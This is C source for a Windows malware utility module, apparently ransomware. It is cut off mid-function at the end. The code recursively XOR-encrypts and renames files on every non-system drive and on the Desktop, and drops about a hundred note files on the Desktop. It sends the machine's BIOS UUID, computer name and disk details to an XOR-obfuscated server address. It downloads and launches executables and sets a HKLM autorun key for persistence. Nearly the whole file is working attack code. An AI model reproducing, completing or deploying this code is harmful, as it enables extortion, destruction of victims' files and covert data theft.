#include "stdafx.h"
#include "yeutility.h"

static __int64 FileSize(const wchar_t* name);
static  DWORD FindFilesRecursively(LPCTSTR lpFolder, LPCTSTR lpFilePattern, PENCRYPTION_ROUTINE routine);
static DWORD XOROperate(PCTSTR ifile, PCTSTR ofile);
static DWORD WINAPI XORDecrypt(PCTSTR ifile);
static DWORD WINAPI XOREncrypt(PCTSTR ifile);
static DWORD reportProcessor();
static DWORD reportDisk();
static DWORD initUUID();
static LPTSTR GetSimplUUID(LPTSTR buf);
static DWORD GetBIOS_UUIDX(LPTSTR buff, DWORD size, LPTSTR cd);
static __int64 FileSize(const wchar_t* name);



static HANDLE g_hLog = INVALID_HANDLE_VALUE;
static TCHAR g_uuid[100] = { 0 };
static TCHAR g_logPath[150];
static HANDLE g_hMuxLog = INVALID_HANDLE_VALUE;

VOID FullDisksCrypt(DWORD dwFlag)
{
	TCHAR servPath[100];
	TCHAR device[3] = { 0 };
	LPCTSTR logMsg[] = { TEXT("%s XOR encrypt finished."), TEXT("%s XOR decrypt finished.") };
	TCHAR temp[100];

	lstrcpy(&device[1], TEXT(":"));
	GetSystemDirectory(servPath, MAX_PATH);
	for (device[0] = 'A'; device[0] <= 'Z'; device[0]++)
	{
		if (!PathFileExists(device)) continue;
		if (device[0] == servPath[0]) continue;
		EncryptFiles(device, dwFlag);
		ZeroMemory(temp, sizeof(temp));
		if (dwFlag == ENCRYPTION_XOR){
			wsprintf(temp, logMsg[0], device);
		}
		else if (dwFlag == DECRYPTION_XOR){
			wsprintf(temp, logMsg[1], device);
		}
		EventLogs(temp);
		SendLogFileToServer();
	}
}

DWORD LaunchExe(LPTSTR exepath){

	if (!PathFileExists(exepath))
		return 0;

	TCHAR szUnicExeName[MAX_PATH] = { 0 };
	STARTUPINFO sti = { sizeof(sti) };
	PROCESS_INFORMATION procInfo = { 0 };
	TCHAR fileName[50] = { 0 };
	LPTSTR p = 0;
	lstrcpy(szUnicExeName, exepath);


	p = PathFindFileName(szUnicExeName);
	if (*p)
		lstrcpy(fileName, p);

	HANDLE hmx = CreateMutex(0, FALSE, fileName);

	if (GetLastError() == ERROR_ALREADY_EXISTS){
		EventLogs(TEXT_COMMON_MESSAGE2);
		CloseHandle(hmx);
		return 2;
	}

	CloseHandle(hmx);

	if (CreateProcess(0, szUnicExeName, 0, 0, FALSE, 0, 0, 0, &sti, &procInfo))
		EventLogs(TEXT_COMMON_MESSAGE7);
	else{
		EventLogs(TEXT_COMMON_MESSAGE8);
		return 0;
	}

	return 1;
}

DWORD DownLoadFile(LPTSTR lpUrl, LPTSTR lpFilePath){
	HINTERNET hNet, hNetUrl;
	DWORD dwRead, dwRet;
	char buffer[1024];
	HANDLE hFile;
	hFile = CreateFile(lpFilePath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		if (GetLastError() == ERROR_SHARING_VIOLATION)
			EventLogs(TEXT_COMMON_MESSAGE2);
		else
			EventLogs(TEXT_COMMON_MESSAGE3);
		return 0;
	}


	hNet = InternetOpen(INTERNET_AGENT, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
	if (!hNet)
	{
		CloseHandle(hFile);
		return 0;
	}
		

	hNetUrl = InternetOpenUrl(hNet, lpUrl, 0, 0, INTERNET_FLAG_RELOAD, 0);
	if (!hNetUrl)
	{
		EventLogs(TEXT_COMMON_MESSAGE9);
		InternetCloseHandle(hNet);
		CloseHandle(hFile);
		return 0;
	}
	TCHAR infoBuffer[50] = {0};
	DWORD dummy;
	DWORD bufLen;
	while ((InternetReadFile(hNetUrl, buffer, sizeof(buffer), &dwRead)) && dwRead)
	{
		dummy = 0;
		bufLen = sizeof(infoBuffer);
		if (HttpQueryInfo(hNetUrl, HTTP_QUERY_STATUS_CODE, infoBuffer, &bufLen, &dummy))
		{
			if (!lstrcmp(infoBuffer, TEXT("200")))
				WriteFile(hFile, buffer, dwRead, &dwRet, 0);
			else
			{
				EventLogs(TEXT_COMMON_MESSAGE11);
				CloseHandle(hFile);
				InternetCloseHandle(hNetUrl);
				InternetCloseHandle(hNet);
				return 0;
			}
						
		}
		
	}
		

	CloseHandle(hFile);
	InternetCloseHandle(hNetUrl);
	InternetCloseHandle(hNet);
	EventLogs(TEXT_COMMON_MESSAGE5);
	return 1;
}
LONGLONG FileSize(const wchar_t* name)
{
	WIN32_FILE_ATTRIBUTE_DATA fad;
	if (!GetFileAttributesEx(name, GetFileExInfoStandard, &fad))
		return -1; // error condition, could call GetLastError to find out more
	LARGE_INTEGER size;
	size.HighPart = fad.nFileSizeHigh;
	size.LowPart = fad.nFileSizeLow;
	return size.QuadPart;
}
DWORD FindFilesRecursively(LPCTSTR lpFolder, LPCTSTR lpFilePattern, PENCRYPTION_ROUTINE routine)
{
	TCHAR szFullPattern[MAX_PATH_Y];
	WIN32_FIND_DATA FindFileData;
	HANDLE hFindFile;
	// first we are going to process any subdirectories
	PathCombine(szFullPattern, lpFolder, lpFilePattern);
	hFindFile = FindFirstFile(szFullPattern, &FindFileData);
	if (hFindFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if (!lstrcmp(FindFileData.cFileName, TEXT(".")) || !lstrcmp(FindFileData.cFileName, TEXT(".."))) continue;
				PathCombine(szFullPattern, lpFolder, FindFileData.cFileName);
				if (!FindFilesRecursively(szFullPattern, lpFilePattern, routine)) return 0;
			}
		} while (FindNextFile(hFindFile, &FindFileData));
		FindClose(hFindFile);
	}

	// Now we are going to look for the matching files
	PathCombine(szFullPattern, lpFolder, lpFilePattern);
	hFindFile = FindFirstFile(szFullPattern, &FindFileData);
	if (hFindFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				PathCombine(szFullPattern, lpFolder, FindFileData.cFileName);
				if (FileSize(szFullPattern) < MAX_CRYPT_SIZE)
					routine(szFullPattern);
			}
		} while (FindNextFile(hFindFile, &FindFileData));
		FindClose(hFindFile);
	}
	return 1;
}

DWORD XOROperate(PCTSTR ifile, PCTSTR ofile)
{
	HANDLE ihFile, ohFile;
	char buffer[1024]; //presuming 1024 is a good block size, I dunno...
	DWORD dwsize, dwOsize;
	int i, end;
	//if (PathFileExists(ofile)) return 1;

	ihFile = CreateFile(ifile, GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (ihFile == INVALID_HANDLE_VALUE)
	{
		//_tprintf(TEXT("Cannot open: %s"), ifile);
		return -1;
	}
	ohFile = CreateFile(ofile, GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (ohFile == INVALID_HANDLE_VALUE)
	{
		//_tprintf(TEXT("Cannot open: %s"), ofile);
		return -1;
	}

	while (ReadFile(ihFile, buffer, sizeof(buffer), &dwOsize, 0) && dwOsize){
		end = dwOsize / 4;
		if (dwOsize % 4)
			++end;

		for (i = 0; i < end; ++i)
		{
			((unsigned int *)buffer)[i] ^= XORENCRY_KEY;
		}
		if (!WriteFile(ohFile, buffer, dwOsize, &dwsize, 0))
		{

			CloseHandle(ihFile);
			CloseHandle(ohFile);
			//printf("cannot write, disk full?\n");
			return -1;
		}
	}
	CloseHandle(ihFile);
	CloseHandle(ohFile);

	//DeleteFile(ifile);

	return 1;
}

DWORD WINAPI XORDecrypt(PCTSTR ifile)
{
	LPTSTR  p;
	TCHAR ofile[MAX_PATH_Y] = { 0 };
	lstrcpy(ofile, ifile);
	p = PathFindExtension(ofile);
	if (lstrcmp(p, THE_EXTENSION))
		return 2;

	DWORD ret;
	ret = XOROperate(ifile, ifile);

	ZeroMemory(p, lstrlen(p));
	if (_wrename(ifile, ofile)) ret = 0;

	return ret;
}

DWORD WINAPI XOREncrypt(PCTSTR ifile)
{
	DWORD ret;
	if (!lstrcmp(PathFindExtension(ifile), THE_EXTENSION))
		return 2;

	ret = XOROperate(ifile, ifile);

	TCHAR ofile[MAX_PATH_Y] = { 0 };
	lstrcpy(ofile, ifile);
	lstrcat(ofile, THE_EXTENSION);
	if (_wrename(ifile, ofile)) ret = 0;

	return ret;
}

DWORD EncryptFiles(LPCTSTR filePath, DWORD dwFlag)
{
	DWORD ret;
	if (!PathFileExists(filePath)) return 0;
	switch (dwFlag)
	{/*
	case ENCRYPTION_ASE:
	if (PathIsDirectory(filePath))
	return FindFilesRecursively(filePath, TEXT("*"), Encrypt);
	else
	return Encrypt(filePath);
	case DECRYPTION_ASE:
	if (PathIsDirectory(filePath))
	return FindFilesRecursively(filePath, TEXT("*"), Decrypt);
	else
	return Decrypt(filePath);*/
	case ENCRYPTION_XOR:
		if (PathIsDirectory(filePath))
			ret = FindFilesRecursively(filePath, TEXT("*"), XOREncrypt);
		else
			ret = XOREncrypt(filePath);
		break;
	case DECRYPTION_XOR:
		if (PathIsDirectory(filePath))
			ret = FindFilesRecursively(filePath, TEXT("*"), XORDecrypt);
		else
			ret = XORDecrypt(filePath);
		break;
	}/*
	if (ret){
		if (dwFlag == ENCRYPTION_XOR)
			EventLogs(TEXT("encrypt finished."));
		else if (dwFlag == DECRYPTION_XOR)
			EventLogs(TEXT("decrypt finished."));
	}
	else{
		if (dwFlag == ENCRYPTION_XOR)
			EventLogs(TEXT("encrypt fail."));
		else if (dwFlag == DECRYPTION_XOR)
			EventLogs(TEXT("decrypt fail."));
	}
	*/
	return ret;
}

DWORD initUUID(){
	unsigned char enc_uuid[] = { UUID_CRYPT_NAME };
	TCHAR uuidFileName[_MAX_FNAME];
	if (!GetUnicDecrKey(enc_uuid, sizeof(enc_uuid), uuidFileName, sizeof(uuidFileName))) 
		return 0;
	TCHAR sysDir[100];
	TCHAR uuidPath[100];
	TCHAR uuid[100] = { 0 };
	DWORD ret;
	if (!GetSystemDirectory(sysDir, sizeof(sysDir))) return 0;
	PathCombine(uuidPath, sysDir, uuidFileName);


	HANDLE hFile = INVALID_HANDLE_VALUE;
	hFile = CreateFile(uuidPath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
		0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE) return 0;


	if (GetLastError() == ERROR_ALREADY_EXISTS){
		ReadFile(hFile, uuid, sizeof(uuid), &ret, 0);
		if (ret)
			memcpy_s(g_uuid, ret, uuid, ret);
	}
	else{
		TCHAR buf[100];
		if (GetBIOS_UUID(buf, sizeof(buf))){
			WriteFile(hFile, buf, lstrlen(buf)*sizeof(buf[0]), &ret, 0);
			memcpy_s(g_uuid, sizeof(g_uuid), uuid, sizeof(uuid));
		}
	}
	CloseHandle(hFile);
	return 1;
}

DWORD GetLocalTime_ye(TCHAR* fmtTime){
	SYSTEMTIME sysTime;
	GetLocalTime(&sysTime);
	wsprintf(fmtTime, TEXT("%d-%d-%d %d:%d:%d"),
		sysTime.wYear, sysTime.wMonth, sysTime.wDay, sysTime.wHour, sysTime.wMinute, sysTime.wSecond);
	return 1;
}

DWORD InitLogs(){
	unsigned char logname[] = { LOG_CRYPT_NAME };
	TCHAR LogFileName[_MAX_FNAME];
		if (!GetUnicDecrKey(logname, sizeof(logname),LogFileName,sizeof(LogFileName)))
			return 0;
	TCHAR sysDir[100];

	if (!GetSystemDirectory(sysDir, sizeof(sysDir))) return 0;

	PathCombine(g_logPath, sysDir, LogFileName);

	g_hLog = CreateFile(g_logPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (g_hLog == INVALID_HANDLE_VALUE) return 0;
	//SetFilePointer(g_hLog, 0, 0, FILE_END);

	g_hMuxLog = CreateMutex(0, FALSE, TEXT("LOGMUTEX"));


	initUUID();
	return 1;
}

DWORD CloseLogs(){
	//EventLogs(TEXT("log closing..."));
	//SendLogFileToServer();
	CloseHandle(g_hMuxLog);
	CloseHandle(g_hLog);
	//DeleteFile(g_logPath);
	return 1;
}

VOID EventLogs(LPCTSTR message)
{
#define MAX_LOG_SIZE 512
	TCHAR fmtTime[50], log[MAX_LOG_SIZE] = {};
	char multLog[MAX_LOG_SIZE] = { 0 };
	DWORD dwRet, size;

	if (g_hLog == INVALID_HANDLE_VALUE) return;
	if (lstrlen(message) > 450) return;
	GetLocalTime_ye(fmtTime);
	wsprintf(log, TEXT("%s      %s\r\n"), fmtTime, message);
	size = WideCharToMultiByte(CP_ACP, 0, log, -1, multLog, sizeof(multLog), 0, 0);

	WaitForSingleObject(g_hMuxLog, INFINITE);
	SetFilePointer(g_hLog, 0, 0, FILE_END);
	WriteFile(g_hLog, multLog, size - 1, &dwRet, 0);
	FlushFileBuffers(g_hLog);
	ReleaseMutex(g_hMuxLog);
}

DWORD reportProcessor(){
	DWORD dwRet = 0;
	SYSTEM_INFO sysInfo;
	LPCTSTR processor[] = { TEXT("processor message:"), TEXT("x64 (AMD or Intel)"), TEXT("ARM"),
		TEXT("Intel Itanium-based)"), TEXT("x86"), TEXT("Unknown architecture.") };

	EventLogs(processor[0]);
	GetSystemInfo(&sysInfo);
	if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
		EventLogs(processor[1]);
	else if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM)
		EventLogs(processor[2]);
	else if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
		EventLogs(processor[3]);
	else if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		EventLogs(processor[4]);
	else if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_UNKNOWN)
		EventLogs(processor[5]);

	return 1;
}

DWORD reportDisk(){

	TCHAR device[40] = { 0 };
	DWORD dwDiskSize = 0, dwDiskFreeSize = 0;
	ULARGE_INTEGER ulFreeSpace = { 0 };
	ULARGE_INTEGER ulTotalSpace = { 0 };
	ULARGE_INTEGER ulTotalFreeSpace = { 0 };
	TCHAR diskInfo[100];
	TCHAR diskName[50];
	TCHAR diskMulName[50];
	DWORD dwRet = 0;

	lstrcpy(&device[1], TEXT(":\\"));
	for (device[0] = 'A'; device[0] <= 'Z'; device[0]++)
	{

		if (!PathFileExists(device)) continue;
		if (!GetVolumeInformation(device, diskName, sizeof(diskName), 0, 0, 0, 0, 0)) return 0;
		//MultiByteToWideChar(CP_ACP,0, (LPCCH)diskName, -1, diskMulName, sizeof(diskMulName));
		if (!GetDiskFreeSpaceEx(device, &ulFreeSpace, &ulTotalSpace, &ulTotalFreeSpace)) return 0;
		ZeroMemory(diskInfo, sizeof(diskInfo));
		dwDiskSize = (DWORD)(ulTotalSpace.QuadPart >> 20);
		dwDiskFreeSize = (DWORD)(ulTotalFreeSpace.QuadPart >> 20);
		wsprintf(diskInfo, TEXT_DISKINFO_FORMAT, device[0], diskName, dwDiskSize, dwDiskFreeSize);
		EventLogs(diskInfo);
		ZeroMemory(diskName, sizeof(diskName));
		ZeroMemory(diskMulName, sizeof(diskMulName));
	}
	return 1;
}

DWORD reportUserMsg(){
	TCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
//	TCHAR userName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
	DWORD siz = MAX_COMPUTERNAME_LENGTH + 1;
	GetComputerName(computerName, &siz);
	//GetUserName(userName, &siz);

	EventLogs(TEXT("computer name:"));
	EventLogs(computerName);
	/*
	EventLogs(TEXT("user name:"));
	EventLogs(userName);
	*/
	return 1;
}

VOID ReportSysInfo(){
	//reportProcessor();
	reportUserMsg();
	reportDisk();
}

DWORD SendLogFileToServerX(){
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;
	char sendbuf[NET_SEND_BUFLEN] = { 0 };
	DWORD dwRet = 0;
	int iResult;
	HANDLE hFile;
	TCHAR logPath[200];
	TCHAR uuid_raw[200], head_data[200];

	if (!GetBIOS_UUID(uuid_raw, sizeof(uuid_raw))) return 0;
	wsprintf(head_data, TEXT("$%s$"), uuid_raw);
	lstrcat(head_data, LOG_FILENAME);
	

	GetSystemDirectory(logPath, sizeof(logPath));
	unsigned char enc[] = { LOG_CRYPT_NAME };
	TCHAR logname[_MAX_FNAME];
	if (!GetUnicDecrKey(enc, sizeof(enc),logname,sizeof(logname)))
		return 0;
	PathCombine(logPath, logPath, logname);

	hFile = CreateFile(logPath,
		GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE) return 0;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		//printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	//iResult = getaddrinfo(SERVER_IP, DEFAULT_PORT, &hints, &result);
	//char enc_url[] = { SERVER_CRYPT_IP_LOCAL };
	unsigned char enc_url[] = { SERVER_CRYPT_IP };
	unsigned char enc_port[] = { LOG_SERVER_CRYPT_PORT };
	DWORD siz = sizeof(enc_url);
	DWORD siz2 = sizeof(enc_port);
	char * ip = (char*)malloc(siz + 1);
	char * dec_port = (char*)malloc(siz2 + 1);
	XORcrypt(enc_url, siz, ip);
	XORcrypt(enc_port, siz2, dec_port);
	ip[siz] = 0;
	dec_port[siz2] = 0;
	iResult = getaddrinfo(ip, dec_port, &hints, &result);
	free(ip);
	free(dec_port);
	if (iResult != 0) {
		//printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();		
		return 0;
	}
	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			//printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();			
			return 0;
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		//printf("Unable to connect to server!\n");	
		WSACleanup();
		return 0;
	}

	// Send an initial buffer
	if (hFile)
	{

		iResult = send(ConnectSocket, (char*)head_data, sizeof(head_data), 0);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			WSACleanup();
			return 1;
		}
		while (ReadFile(hFile, sendbuf, sizeof(sendbuf), &dwRet, 0) && dwRet > 0){
			iResult = send(ConnectSocket, sendbuf, dwRet, 0);

			if (iResult == SOCKET_ERROR) {
				//	printf("send failed with error: %d\n", WSAGetLastError());
				closesocket(ConnectSocket);
				WSACleanup();
				return 1;
			}
		}
		CloseHandle(hFile);
	}
	//printf("Bytes Sent: %ld\n", iResult);
	// shutdown the connection since no more data will be sent
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		//	printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 0;
	}

	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();	
	return 1;
}

DWORD SendLogFileToServer(){
	DWORD ret = 0;
	ret = SendLogFileToServerX();
	WaitForSingleObject(g_hMuxLog, INFINITE);
	SetFilePointer(g_hLog, 0, 0, FILE_BEGIN);
	SetEndOfFile(g_hLog);
	ReleaseMutex(g_hMuxLog);
	return ret;
}

LPTSTR GetSimplUUID(LPTSTR buf){
	DWORD ret = 1;
	LPTSTR start = 0, end = 0;
	start = wcschr(buf, TEXT('\n'));
	if (start) start++;

	end = wcschr(start, TEXT(' '));
	if (end)
		*end = 0;

	if (!start || !end)
		ret = 0;
	return start;
}
/*
DWORD GetBIOS_UUID(LPTSTR buff, DWORD size){
srand((unsigned int)time(0));
wsprintf(buff, TEXT("%x"), 0xffffffff);
return 1;
}
*/

DWORD GetBIOS_UUIDX(LPTSTR buff, DWORD size, LPTSTR cd){
	HANDLE pipeR, pipeW;
	SECURITY_ATTRIBUTES sa;
	STARTUPINFO sui = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION proInfo;
	DWORD dwRet, ret = 0;
	LPTSTR pUUID = 0;
	TCHAR cmd[100] = { 0 };

	TCHAR unicUUID[400];
	char cc[200];

	lstrcpy(cmd, cd);

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&pipeR, &pipeW, &sa, 0)) return 0;

	sui.hStdOutput = pipeW;
	sui.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
	sui.hStdError = GetStdHandle(STD_ERROR_HANDLE);
	sui.dwFlags = STARTF_USESTDHANDLES;

	CreateProcess(0, cmd, 0, 0, TRUE, 0, 0, 0, &sui, &proInfo);
	DWORD exitCode;
	do{
		GetExitCodeProcess(proInfo.hProcess, &exitCode);
	} while (exitCode == STILL_ACTIVE);
	CloseHandle(proInfo.hProcess);
	CloseHandle(proInfo.hThread);
	CloseHandle(pipeW);

	ReadFile(pipeR, cc, sizeof(cc), &dwRet, 0);
	if (dwRet > 0)
	{
		MultiByteToWideChar(CP_ACP, 0, cc, sizeof(cc), unicUUID, sizeof(unicUUID));
		if (!(pUUID = GetSimplUUID(unicUUID))) ret = 0;
		else{
			memcpy_s(buff, size, pUUID, (pUUID - unicUUID)*sizeof(pUUID[0]));
			ret = 1;
		}
	}

	CloseHandle(pipeR);
	return ret;
}

DWORD GetBIOS_UUID(LPTSTR buff, DWORD size){
	DWORD ret = 1;
	if (lstrlen(g_uuid) == 0){
		LPTSTR raw = (LPTSTR)malloc(size * 2);
		ret = GetBIOS_UUIDX(raw, size, BIOS_UUID_CMD);

		if (!lstrcmp(raw, TEXT("FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF"))){
			ZeroMemory(raw, size);
			ret = GetBIOS_UUIDX(raw, size, DISK_SERILNUM_CMD);
		}
		memcpy_s(g_uuid, sizeof(g_uuid), raw, sizeof(g_uuid));
		free(raw);
	}
	memcpy_s(buff, size, g_uuid, sizeof(g_uuid));
	return ret;
}

DWORD XORcrypt(unsigned char* org, int isize, char *out){

	unsigned int key = 0xface4389;
	if (!org || !out || !isize) return 0;
	memcpy_s(out, isize, org, isize);

	int i = isize / 4;
	for (int j = 0; j < i; j++){
		((unsigned int*)out)[j] ^= key;
	}
	return 1;
}

DWORD GetUnicDecrKey(unsigned char* enc, DWORD isiz, LPTSTR out, DWORD osiz){
	char* buff;
	int unicUrlSize;

	buff = (char*)malloc(isiz + 1);
	if (!buff) return 0;
	unicUrlSize = (isiz + 1)*sizeof(TCHAR);
	LPTSTR unicDecUrl = (LPTSTR)malloc(unicUrlSize);
	if (!unicDecUrl){
		free(buff);
		return 0;
	}

	XORcrypt(enc, isiz, buff);
	buff[isiz] = 0;

	MultiByteToWideChar(CP_ACP, 0, buff, -1, unicDecUrl, unicUrlSize);
	free(buff);
	memcpy_s(out, osiz, unicDecUrl, unicUrlSize);
	free(unicDecUrl);
	return 1;
}

/*
LPTSTR GetDecryptUrl(LPCTSTR addPath){
	unsigned char  penc_url[] = { SERVER_CRYPT_IP };
	DWORD urlsize = sizeof(penc_url);
	if (!penc_url) return 0;
	TCHAR servUrl[_MAX_FNAME];
	if (!GetUnicDecrKey(penc_url, urlsize,servUrl,sizeof(servUrl)))
		return 0;
	DWORD siz = urlsize*sizeof(TCHAR)+200;
	LPTSTR p = (LPTSTR)malloc(siz);
	if (!p) return 0;
	ZeroMemory(p, siz);
	lstrcat(p, TEXT("http://"));
	lstrcat(p, servUrl);
	lstrcat(p, TEXT("/"));

	if (UrlCombine(p, addPath, p, &siz, 0) == E_POINTER) return 0;
	return p;
}
*/
VOID URL_cryptTest(){
	unsigned char enc_data[] = { USER_REMOTE_CRYPT_URL };


	TCHAR dec_data[_MAX_FNAME];
	if (!GetUnicDecrKey(enc_data, sizeof(enc_data), dec_data,sizeof(dec_data)))
		return;
	_tprintf(dec_data);
	printf("\n");





	unsigned char url[] = {"27016" };
	int size = sizeof(url);
	char* buf = (char*)malloc(size);
	if (!buf) return;

	XORcrypt(url, size, buf);
	for (int i = 0; i < size; i++)
		printf("0x%02x,", (unsigned char)buf[i]);
	free(buf);


	getchar();
}
/*
FILE*  InitLogs()
{
FILE* logFp;
TCHAR logPath[MAX_PATH] = { 0 };
GetSystemDirectory(logPath, sizeof(logPath));
//PathCombine(logPath, logPath, LOG_FILE_NAME);
PathCombine(logPath, TEXT("C:\\Users\\zhuqiangye\\Desktop\\virus"), LOG_FILE_NAME);
_tfopen_s(&logFp,logPath, _T("a+"));
if (logFp != NULL) _ftprintf_s(logFp,_T("Initialized Logging\r\n"));
return logFp;
}


LPCTSTR GetLastErrorMsg(LPTSTR phlocal, DWORD dwError){

DWORD systemLocale = MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL);

BOOL fOk = FormatMessage(
FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_ALLOCATE_BUFFER,
NULL, dwError, LANG_SYSTEM_DEFAULT,
(LPTSTR)(phlocal), 0, NULL);

if (!fOk) {
// Is it a network-related error?
HMODULE hDll = LoadLibraryEx(TEXT("netmsg.dll"), NULL,
DONT_RESOLVE_DLL_REFERENCES);

if (hDll != NULL) {
fOk = FormatMessage(
FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_IGNORE_INSERTS,
hDll, dwError, systemLocale,
(LPTSTR)phlocal, 0, NULL);
FreeLibrary(hDll);
}
}

if (fOk && (*phlocal != NULL)) {
//return (PCTSTR)LocalLock(hlocal);

DWORD* p = (DWORD*)phlocal;
return (LPCTSTR)(*p);
}
else {
return TEXT("No text found for this error number.");
}
}*/
/*
DWORD WINAPI Encrypt(LPCTSTR infileName){
STARTUPINFO sui = { sizeof(sui) };
PROCESS_INFORMATION procInfo = {0};
TCHAR cmd[MAX_PATH_Y];
TCHAR uniFile[100] = { 0 };
LPCTSTR key = TEXT("yegong");

EncryptFileCmd(infileName, infileName, key, cmd);
return CreateProcess(0, cmd, 0, 0, 0, 0, 0, 0, &sui, &procInfo);
}

DWORD WINAPI Decrypt(LPCTSTR infileName){
STARTUPINFO sui = { sizeof(sui) };
PROCESS_INFORMATION procInfo = {0};
TCHAR cmd[MAX_PATH_Y];
LPCTSTR key = TEXT("yegong");

DecryptFileCmd(infileName, infileName, key, cmd);
return CreateProcess(0, cmd, 0, 0, 0, 0, 0, 0, &sui, &procInfo);
}
*/

VOID DesktopCrypt(DWORD dwFlag){
	TCHAR dir[MAX_PATH];
	SHGetFolderPath(HWND_DESKTOP, CSIDL_DESKTOP, 0, 0, dir);

	if (!PathFileExists(dir)){
		EventLogs(TEXT_COMMON_MESSAGE10);
		return;
	}
	EncryptFiles(dir, dwFlag);

	TCHAR mfile[50];
	TCHAR path[MAX_PATH] = {0};
	TCHAR path2[MAX_PATH] = { 0 };
	HANDLE hfile = INVALID_HANDLE_VALUE;
	TCHAR msg[100] = { IMPORT_MESSAGE };
	char mulMsg[200];
	DWORD dwRet;
	PathCombine(path, dir, TEXT("重要95230.txt"));

	if (dwFlag == ENCRYPTION_XOR){
		hfile = CreateFile(path, GENERIC_WRITE, 0, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
		if (hfile == INVALID_HANDLE_VALUE) return;
		WideCharToMultiByte(CP_ACP, 0, msg, -1, mulMsg, sizeof(mulMsg), 0, 0);
		if (!WriteFile(hfile, mulMsg, strlen(mulMsg)*sizeof(mulMsg[0]), &dwRet, 0)) return;
		CloseHandle(hfile);

		for (int i = 1; i < 100; i++){
			wsprintf(mfile, TEXT("重要9523%x.txt"), i);
			PathCombine(path2, dir, mfile);
			CopyFile(path, path2, TRUE);
		}
	}
	else if(dwFlag==DECRYPTION_XOR){
		for (int i = 0; i < 100; i++){
			wsprintf(mfile, TEXT("重要9523%x.txt"), i);
			PathCombine(path2, dir, mfile);  
			DeleteFile(path2);
		}
	}


}

DWORD SetAutoRunApp(LPCTSTR apppath){
	HKEY key;
	DWORD r;
	unsigned char enc_data[] = { REG_AUTORUN_CRYPT_PATH };
	TCHAR dec_data[_MAX_FNAME];
		if (!GetUnicDecrKey(enc_data, sizeof(enc_data),dec_data,sizeof(dec_data)))
			return 0;
		r = RegOpenKeyEx(HKEY_LOCAL_MACHINE, dec_data, 0, KEY_SET_VALUE, &key);
	if (r) return 0;
	RegSetValueEx(key, REG_AUTORUN_NAME, 0, REG_SZ, (const BYTE*)apppath, lstrlen(apppath)*sizeof(apppath[0]));
	RegCloseKey(key);	
	return 1;
}

DWORD FileRegexMatching(HANDLE hIn, HANDLE hOut,const char* pattern){

	regex_t regex;
	regmatch_t matchs[20];
	char error[100];
	int nmatch = sizeof(matchs) / sizeof(matchs[0]);
	int err;
	if (err = regcomp(&regex, pattern, REG_EXTENDED |REG_ICASE)){
		regerror(err, &regex, error, sizeof(error));
		printf("%s",error);
		return 0;
	}

	char buffer[4096] = { 0 };
	DWORD dwRet;

